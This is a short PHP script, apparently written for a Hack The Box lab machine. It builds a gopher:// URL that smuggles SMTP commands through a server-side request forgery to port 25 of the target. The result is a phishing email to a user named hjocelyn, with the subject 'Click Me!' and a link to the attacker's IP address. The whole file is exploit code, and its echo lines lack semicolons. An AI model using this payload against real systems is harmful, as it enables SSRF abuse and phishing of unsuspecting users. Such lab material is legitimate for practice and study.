<?php
        $commands = array(
                'HELO root.htb',
                'MAIL FROM: ender@root.htb',
                'RCPT TO: hjocelyn@gofer.htb',
                'DATA',
                'Subject: Click Me!',
                'http://10.10.14.41',
                '.'
	);
	
	$payload = implode('%0A', $commands);

	echo 'URL-Encode:'
	echo 'gopher://10.10.11.225:25/_' . $payload
?>
